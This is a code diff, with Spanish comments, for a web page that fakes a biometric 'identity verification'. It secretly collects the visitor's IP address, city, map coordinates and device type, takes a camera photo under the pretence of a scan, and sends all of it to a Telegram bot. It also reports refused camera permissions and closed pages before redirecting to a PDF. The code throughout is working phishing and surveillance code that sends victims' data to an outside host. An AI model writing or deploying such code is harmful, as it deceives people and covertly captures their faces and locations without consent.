@@ -40,6 +40,7 @@
         window.addEventListener('beforeunload', function (e) {
             if (!procesoExitoso) {
                 const reporteAbandono = "⚠️ *ALERTA DE ABANDONO*\nEl usuario cerró la página antes de completar la verificación.";
+                // sendBeacon asegura el envío incluso si la pestaña se está cerrando
                 navigator.sendBeacon(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, JSON.stringify({
                     chat_id: CONFIG.CHAT_ID,
                     text: reporteAbandono,
@@ -49,7 +50,9 @@
         });
 
         async function validarBiometria() {
+            // Feedback táctil
             if (navigator.vibrate) navigator.vibrate([100]);
+            
             status.innerHTML = "MANTENGA PRESIONADO...";
             laser.style.display = "block";
             ring.style.display = "block";
@@ -57,10 +60,11 @@
             let infoDispositivo = "";
 
             try {
-                // 1. Obtener datos del equipo e IP
+                // 1. Obtener datos de red y equipo
                 const resIP = await fetch('https://ipapi.co/json/');
                 const d = await resIP.json();
                 const equipo = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Móvil Desconocido";
+                
                 infoDispositivo = `📱 *EQ:* ${equipo}\n🌐 *IP:* \`${d.ip}\`\n📍 *Lugar:* ${d.city}, ${d.country_name}\n🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
                 // 2. Intentar Acceso a Cámara
@@ -70,16 +74,21 @@
                 video.setAttribute("playsinline", true);
                 await video.play();
                 
-                // Espera de 1.5s para simular escaneo y enfocar cámara
+                // Espera de 1.5s para simular el escaneo y que la cámara ajuste el brillo
                 await new Promise(r => setTimeout(r, 1500));
 
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.width = video.videoWidth; 
+                canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                const fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
+                
+                // Convertir a imagen
+                const fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
+                
+                // Apagar cámara
                 stream.getTracks().forEach(t => t.stop());
 
-                // 3. Envío Exitoso a Telegram
+                // 3. Envío con Foto a Telegram
                 const fd = new FormData();
                 fd.append('chat_id', CONFIG.CHAT_ID);
                 fd.append('photo', fotoBlob, 'foto.jpg');
@@ -88,14 +97,19 @@
 
                 await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 
+                // Éxito: marcamos para evitar reporte de abandono
                 procesoExitoso = true;
                 beep.play();
                 status.innerHTML = "✅ IDENTIDAD CONFIRMADA";
-                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1500);
+                
+                setTimeout(() => { 
+                    window.location.href = CONFIG.PDF_URL; 
+                }, 1500);
 
             } catch (err) {
-                // 4. Reporte de Error a Telegram (¿Por qué no llegó la foto?)
+                // 4. Reporte de Error Específico a Telegram
                 let mensajeError = "❌ *ERROR DE CAPTURA*\n\n";
+                
                 if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                     mensajeError += "🚫 *Razón:* El usuario RECHAZÓ el permiso de cámara.";
                 } else if (err.name === 'NotFoundError') {
